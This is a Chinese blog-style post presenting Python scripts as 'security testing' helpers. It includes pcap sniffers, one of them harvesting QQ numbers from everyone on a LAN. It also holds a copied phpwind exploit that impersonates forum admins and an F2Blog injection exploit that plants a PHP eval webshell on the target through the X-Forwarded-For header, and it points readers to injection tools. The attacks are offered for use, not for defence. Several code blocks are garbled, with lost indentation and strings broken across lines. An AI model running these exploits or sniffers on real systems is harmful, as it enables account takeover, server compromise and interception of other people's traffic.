@@ -1,0 +1,241 @@
+Python常用辅助安全测试6个代码例子
+
+Python, 例子, 代码, 辅助Python, 例子, 代码, 辅助
+这些代码，大部分是从别处转来的。测试的时候会比较有用。比如数据嗅探，发送请求，正则表达式处理文件，注入测试等。
+实际中可以根据自己的项目，进行一定程度的扩展。代码是简洁为主。这部分代码是偏重安全测试的。
+学习python已经3月了。感觉非常有用。
+前些天，pm还让我写一个程序辅助他办公。
+
+近来发现很多公司也开始在自己的招聘职位上加上了python。
+对于python。功能说的太多没有用，我发一些例子。
+我也推荐大家有时间不妨学习一下。一天基本上就可以学会。
+外国非常流行。我的pm是德国人，他们国家好像是直接学习python，就像咱们学习c一样普及。
+国外搞python开发的人很多，公司也很多。国内的相对较少。
+我学习这个，是为了辅助工作和玩hack。日常用也很强大。
+google有个google app enginer，是个类似虚拟主机的服务。使用python开发web应用。
+另外，google本身是基于python的。
+
+大多数应用，都可以使用一个函数搞定，比如文件下载，发送请求，分析网页，读写xml，文件压缩，爬虫搜索。
+这些应用绝大多数是跨平台的。可以在linux下运行。
+ironpyhon是一个组合.net平台和python的工具，他们正在研究如何利用python把.net放在linux上运行。
+
+诺基亚的手机也开始支持python编程。
+java，.net 也开始提供python版本。
+
+下面举些例子，演示一下python的功能。
+
+1、数据嗅探，这个例子，是嗅探土豆网上的flash真正的播放地址。
+import pcap ,struct , re
+from pickle import dump,load
+pack=pcap.pcap()
+pack.setfilter('tcp port 80')
+regx=r'/[\w+|/]+.flv|/[\w+|/]+.swf'
+urls=[]
+hosts=[]
+print 'start capture....'
+for recv_time,recv_data in pack:
+    urls=re.findall(regx,recv_data);
+    if(len(urls)!=0):print urls;
+
+2、嗅探qq号码，前些天我还用它嗅探局域网里所有的qq那。可惜没有识别性别的功能。不过可以自己添加
+
+# -*- coding: cp936 -*-
+import pcap ,struct
+pack=pcap.pcap()
+pack.setfilter('udp')
+key=''
+for recv_time,recv_data in pack:
+   recv_len=len(recv_data)
+   if recv_len == 102 and recv_data[42]== chr(02) and recv_data[101]
+== chr(03):
+      print struct.unpack('>I',recv_data[49:53])[0]
+   elif recv_len == 55:
+      print struct.unpack('>I',recv_data[49:53])[0]
+
+3、数据嗅探，项目中遇到，需要嗅探一些发送到特定端口的数据，于是花了几分钟写了一个程序。
+
+import pcap ,struct
+from pickle import dump,load
+pack=pcap.pcap()
+pack.setfilter('port 2425')
+f=open(r'/mm.txt','w+')
+print 'start capture....'
+for recv_time,recv_data in pack:
+    print recv_time
+    print recv_data
+    f.write(recv_data)
+
+3、5   文件内容搜索，我发现windows的自带的搜索无法搜索内容。即使搜索到也不准。就自己写了一个
+
+import os,string,re,sys
+
+class SevenFile:
+    files=[]
+    def FindContent(self,path):
+        print 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
+        walks=os.walk(path)
+        for walk in walks:
+            for filename in walk[2]:
+                if('.mht' == filename[-4:]):
+                    res_taskid=[]
+                    file=walk[0]+'\\'+filename
+                    f=open(file)
+                    content=f.read()
+                    pattern_taskid=re.compile(r'Stonehenge-UIVerificationChecklist\.mht',re.IGNORECASE) #
+                    res_taskid=pattern_taskid.findall(content)
+                    f.close()
+                    if len(res_taskid)>0:
+                        self.files.append(file)
+
+def run():
+    f=SevenFile()
+    f.FindContent(r"E:\work\AP\Manual Tests\PSIGTestProject\PSIGTestProject")
+    for filepath in f.files:
+        print filepath    
+    print "OK"
+
+if __name__=="__main__":
+    run()
+
+4、这个不是我写的，是一个网上的攻击phpwind论坛的一个代码
+
+# -*- coding: gb2312 -*-
+import urllib2,httplib,sys
+httplib.HTTPConnection.debuglevel = 1
+cookies = urllib2.HTTPCookieProcessor()
+opener = urllib2.build_opener(cookies)
+
+def usage():
+print "Usage:\n"
+print " $ ./phpwind.py pwforumurl usertoattack\n"
+print " pwforumurl 目标论坛地址如http://www.80sec.com/"
+print " usertoattack 目标拥有权限的斑竹或管理员"
+print " 攻击结果将会在目标论坛注册一个和目标用户一样的帐户"
+print " 最新版本可以使用uid登陆"
+print " 其他版本可以使用cookie+useragent登陆"
+print "########################################################"
+print ""
+
+argvs=sys.argv
+usage()
+
+data = "regname=%s
+%s1&regpwd=@80sec&regpwdrepeat=@80sec&regemail=...@foo.com&regemailtoall=1&step=2"
+% (argvs[2],"%c1")
+pwurl = "%s/register.php" % argvs[1]
+
+request = urllib2.Request(
+url = pwurl ,
+headers = {'Content-Type' : 'application/x-www-form-
+urlencoded','User-Agent': '80sec owned this'},
+data = data)
+f=opener.open(request)
+headers=f.headers.dict
+cookie=headers["set-cookie"]
+try:
+if cookie.index('winduser'):
+print "Exploit Success!"
+print "Login with uid password @80sec or Cookie:"
+print cookie
+print "User-agent: 80sec owned this"
+except:
+print "Error! http://www.80sec.com"
+print "Connect root#80sec.com"
+
+5、黑客注入攻击，针对指定网站的注入演示
+
+#!c:\python24\pyton
+# Exploit For F2Blog All Version
+# Author BY MSN:pt...@vip.sina.com
+# Date: Jan 29 2007
+
+import sys
+import httplib
+from urlparse import urlparse
+from time import sleep
+
+def injection(realurl,path,evil): #url,/bk/,evilip
+   cmd=""
+   cookie=""
+   header={'Accept':'*/*','Accept-Language':'zh-
+cn','Referer':'http://'+realurl[1]+path+'index.php','Content-
+Type':'application/x-www-form-urlencoded','User-
+Agent':useragent,'Host':realurl[1],'Content-length':len(cmd),
+         'Connection':'Keep-Alive','X-Forwarded-
+For':evil,'Cookie':cookie}
+   #cmd =
+"formhash=6a49b97f&referer=discuz.php&loginmode=&styleid=&cookietime=2592000&loginfield=username&username=test&password=123456789&questionid=0&answer=&loginsubmit=
+%E6%8F%90+%C2%A0+%E4%BA%A4"
+   #print header
+   #print path
+   #sys.exit(1)
+   http = httplib.HTTPConnection(realurl[1])
+   http.request("POST",path+"index.php",cmd, header)
+   sleep(1)
+   http1 = httplib.HTTPConnection(realurl[1])
+   http1.request("GET",path+"cache/test11.php")
+   response = http1.getresponse()
+   re1 = response.read()
+   #print re1
+   print re1.find('test')
+   if re1.find('test') ==0:
+     print 'Expoilt Success!\n'
+     print 'View Your shell:\t%s' %shell
+     sys.exit(1);
+
+   else:
+     sys.stdout.write("Expoilt FALSE!")
+     http.close()
+     #sleep(1)
+     #break
+     sys.stdout.write("\n")
+
+def main ():
+print 'Exploit For F2Blog All Version'
+print 'Codz by pt...@vip.sina.com\n'
+if len(sys.argv) == 2:
+   url = urlparse(sys.argv[1])
+   if url[2:-1] != '/':
+       u = url[2] + '/'
+   else:
+       u = url[2] #u=/bk/
+else:
+   print "Usage: %s <url> " % sys.argv[0]
+   print "Example: %s http://127.0.0.1/bk" % sys.argv[0]
+   sys.exit(0)
+
+print '[+] Connect %s' % url[1]
+print '[+] Trying...'
+print '[+] Plz wait a long long time...'
+global shell,useragent
+shell="http://"+url[1]+u+"cache/test11.php"
+query ='fputs(fopen(\'cache/test11.php\',\'w+\'),\'<?
+@eval($_REQUEST[c])?>test\')'
+query ='\'));'+query+';/*'
+evilip=query
+useragent=""
+cookie=""
+injection(url,u,evilip)
+evilip=""
+injection(url,u,evilip)
+
+print '[+] Finished'
+
+if __name__ == '__main__': main()
+
+6、黑客注入攻击，这是一个完整的access+asp注入工具。
+代码有点长，自己下载吧。
+
+http://www.xfocus.net/tools/200408/780.html
+
+国外还有更厉害的python注入工具（sqlmap），支持现在基本上所有的数据库。 MySQL, Oracle, PostgreSQL and Microsoft SQL
+Server database management system back-end. Besides these four DBMS,
+sqlmap can also identify Microsoft Access, DB2, Informix and Sybase;
+
+自己搜索下载吧。
+
+支持get,post ，cookie注入。可以添加cookie和user-agent
+支持盲注，错误回显注入，还有其他多种注入方法。
+支持代理，
+优化算法，更高效。
+指纹识别技术判断数据库
